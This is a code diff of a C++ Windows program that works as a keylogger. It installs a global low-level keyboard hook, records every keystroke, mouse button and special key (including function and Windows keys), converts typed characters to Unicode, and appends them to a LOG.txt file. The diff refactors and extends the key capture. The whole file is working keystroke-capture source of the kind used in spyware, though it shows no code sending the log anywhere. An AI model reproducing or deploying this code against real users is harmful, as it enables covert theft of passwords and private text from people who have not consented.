@@ -1,49 +1,32 @@
 
 
-    
-
-
-
-
-
-
-// --------------------------------------------------------------------------------------------------------------
-
-
-
-#define _WIN32_WINNT 0x0500
+//#define _WIN32_WINNT 0x0500
 #include<Windows.h>
 #include<stdio.h>
 
 using namespace std;
  
-HHOOK hHock = NULL;
-const char* file = "LOG.txt";
+HHOOK keyboard_hHock = NULL; // Keyboard Hook
+ 
+
+const char* file = "LOG.txt"; // Path to the file where the key logs are saved
 
 
-// Save Pressed Key
+// Save - Pressed Key ------------------------------------------------------------------------------
 #pragma warning (disable : 4996)
-void SaveKey(char* key)
+void SaveKey(const char* key)
 {
     FILE* outputFile;      
-    outputFile = fopen(file, "a+");
-    fprintf(outputFile, "%s", key);
+    outputFile = fopen(file, "a+"); // "a+" = Append Mode
+    fprintf(outputFile, "%s", key);  // "%s" Write the key as string to the file
     fclose(outputFile);      
 }
 
+ 
 
-
-// Save Pressed Special Key / Add text for each special key
-#pragma warning (disable : 4996)
-void SaveSpecialKey(const char* specialKey)
-{
-    FILE* outputFile;
-    outputFile = fopen(file, "a+");
-    fprintf(outputFile, specialKey);
-    fclose(outputFile);
-}
 
 KBDLLHOOKSTRUCT  kbdStruct;
+
  
 // HOOK -----------------------------------------------------------------------------------------------
 #pragma warning (disable : 4996)
@@ -52,77 +35,94 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
     if (nCode >= HC_ACTION) // Checks if wParam and lParam contain valid data or not. If nCode is HC_ACTION (0), then they do, otherwise they do not.
     {
 
-        //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
+        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
+        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+      
+    
 
-        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
         if (kbdStruct.vkCode != 0)
         {
 
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-        {
-            //switch (p->vkCode) {
-            switch (kbdStruct.vkCode) {
+               if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+               {
+                   //switch (p->vkCode) {
+                   switch (kbdStruct.vkCode) {
+            
+                        // Special Keys / Invisible keys
+                        case VK_LBUTTON:	SaveKey("<L_MOUSE>");	break;
+                        case VK_RBUTTON:	SaveKey("<R_MOUSE>");	break;
+                        case VK_MBUTTON:	SaveKey("<M_MOUSE>");	break;
 
-                // Special Keys / Invisible keys
-            case VK_CAPITAL:	SaveSpecialKey("<CAPLOCK>");	break;
-            case VK_SHIFT:		SaveSpecialKey("<SHIFT>");		break;
-            case VK_LCONTROL:	SaveSpecialKey("<LCTRL>");		break;
-            case VK_RCONTROL:	SaveSpecialKey("<RCTRL>");		break;
-            case VK_INSERT:		SaveSpecialKey("<INSERT>");		break;
-            case VK_END:		SaveSpecialKey("<END>");		break;
-            case VK_PRINT:		SaveSpecialKey("<PRINT>");		break;
-            case VK_DELETE:		SaveSpecialKey("<DEL>");		break;
-            case VK_BACK:		SaveSpecialKey("<BK>");			break;
-            case VK_RETURN:		SaveSpecialKey("\n");			break;
-
-            case VK_LEFT:		SaveSpecialKey("<LEFT>");		break;
-            case VK_RIGHT:		SaveSpecialKey("<RIGHT>");		break;
-            case VK_UP:			SaveSpecialKey("<UP>");			break;
-            case VK_DOWN:		SaveSpecialKey("<DOWN>");		break;
-
-                // Ordinary keys / Visible keys
-            default:
-                unsigned char keyboardState[256];
-                for (int i = 0; i < 256; ++i)
-                    keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
-
-                wchar_t wbuffer[3] = { 0 };
-
-                int result = ToUnicodeEx(
-                    kbdStruct.vkCode,
-                    kbdStruct.scanCode,
-                    keyboardState,
-                    wbuffer,
-                    sizeof(wbuffer) / sizeof(wchar_t),
-                    0,
-                    GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
-              
-                if (result > 0)
-                {
-                    char buffer[5] = { 0 };
-                    WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
-                   
-
-                    SaveKey(buffer);
-
-              /*      FILE* outputFile;
-                    outputFile = fopen(file, "a+");
-                    fprintf(outputFile, "%s", buffer);
-                    fclose(outputFile);*/
-                    //SaveKey(char(buffer));
-                }
-
-               /* SaveKey(char(p->vkCode));*/
-            }
+                        case VK_SNAPSHOT:	SaveKey("<PRINT_SCREEN>"); break;
+                        case VK_APPS:	    SaveKey("<APP_KEY>");   break;
+                        case VK_LWIN:	    SaveKey("<L_WIN>");     break;
+                        case VK_RWIN:	    SaveKey("<R_WIN>");     break;
+                        case VK_PRIOR:	    SaveKey("<PG_UP>");     break;
+                        case VK_NEXT:	    SaveKey("<PG_DOWN>");   break;
+                        case VK_ESCAPE:	    SaveKey("<ESC>");    	break;
+                        case VK_CAPITAL:	SaveKey("<CAPLOCK>");	break;
+                        case VK_SHIFT:		SaveKey("<SHIFT>");		break;
+                        case VK_RMENU:		SaveKey("<R_ALT>");		break;
+                        case VK_LMENU:		SaveKey("<L_ALT>");		break;
+                        case VK_LCONTROL:	SaveKey("<LCTRL>");		break;
+                        case VK_RCONTROL:	SaveKey("<RCTRL>");		break;
+                        case VK_INSERT:		SaveKey("<INSERT>");    break;
+                        case VK_END:		SaveKey("<END>");		break;
+                        case VK_HOME:	    SaveKey("<HOME>");      break;
+                        case VK_PRINT:		SaveKey("<PRINT>");		break;
+                        case VK_DELETE:		SaveKey("<DEL>");		break;
+                        case VK_BACK:		SaveKey("<BK>");	    break;
+                        case VK_RETURN:		SaveKey("\n");			break;
+                                             
+                        case VK_LEFT:		SaveKey("<LEFT>");		break;
+                        case VK_RIGHT:		SaveKey("<RIGHT>");		break;
+                        case VK_UP:			SaveKey("<UP>");	    break;
+                        case VK_DOWN:		SaveKey("<DOWN>");		break;
 
 
-         /*   char cc = (p->vkCode);
-            const char* gg = &cc;
-            printf("%s", gg);*/
-        }
+                        case VK_F1:		SaveKey("<F1>");		break;
+                        case VK_F2:		SaveKey("<F2>");		break;
+                        case VK_F3:		SaveKey("<F3>");		break;
+                        case VK_F4:		SaveKey("<F4>");		break;
+                        case VK_F5:		SaveKey("<VK_F5>");		break;
+                        case VK_F6:		SaveKey("<VK_F6>");		break;
+                        case VK_F7:		SaveKey("<VK_F7>");		break;
+                        case VK_F8:		SaveKey("<VK_F8>");		break;
+                        case VK_F9:		SaveKey("<VK_F9>");		break;
+                        case VK_F10:    SaveKey("<VK_F10>");	break;
+                        
+                         // Ordinary keys / Visible keys
+                        default:
+                      
+                            unsigned char keyboardState[256];
+                       for (int i = 0; i < 256; ++i)
+                           keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
+            
+                       wchar_t wbuffer[3] = { 0 };
+            
+                       // Convert to Unicode // Multi Language characters 
+                       int result = ToUnicodeEx(
+                           kbdStruct.vkCode,
+                           kbdStruct.scanCode,
+                           keyboardState,
+                           wbuffer,
+                           sizeof(wbuffer) / sizeof(wchar_t),
+                           0,
+                           GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
+                     
+                       // If sucessfully converted
+                       if (result > 0)
+                       {
+                           char buffer[5] = { 0 };
+                           WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
+                           SaveKey(buffer); // Save the Key
+                       }
+                   }
+               }
         }
     }
-    return CallNextHookEx(hHock, nCode, wParam, lParam);
+    return CallNextHookEx(keyboard_hHock, nCode, wParam, lParam);
 }
 
 
@@ -130,7 +130,7 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
 int main()
 {
     MSG msg;
-    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
+    keyboard_hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
    
     // Listen for msg / listen for keys
     while (!GetMessage(&msg, NULL, NULL, NULL))
@@ -139,7 +139,7 @@ int main()
         DispatchMessage(&msg);
     }
 
-    UnhookWindowsHookEx(hHock); // Remove hook before closing tha app
+    UnhookWindowsHookEx(keyboard_hHock); // Remove hook before closing tha app
 }
 
 
@@ -157,31 +157,3 @@ int main()
 
 
 
-
-
-// -------------------------------------------------------------------------------------
-//
-//#include<Windows.h>
-//#include <stdio.h>
-//
-//
-//HHOOK hHock = NULL;
-//
-//LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
-//{
-//    printf("_a_");
-//    return CallNextHookEx(hHock, nCode, wParam, lParam);
-//}
-//
-//int main()
-//{
-//    MSG msg;
-//    hHock = SetWindowsHookEx(WH_MOUSE_LL, MyLowLevelHook, NULL, NULL);
-//
-//    while (!GetMessage(&msg, NULL, NULL, NULL)) {
-//        TranslateMessage(&msg);
-//        DispatchMessage(&msg);
-//    }
-//
-//    UnhookWindowsHookEx(hHock);
-//}
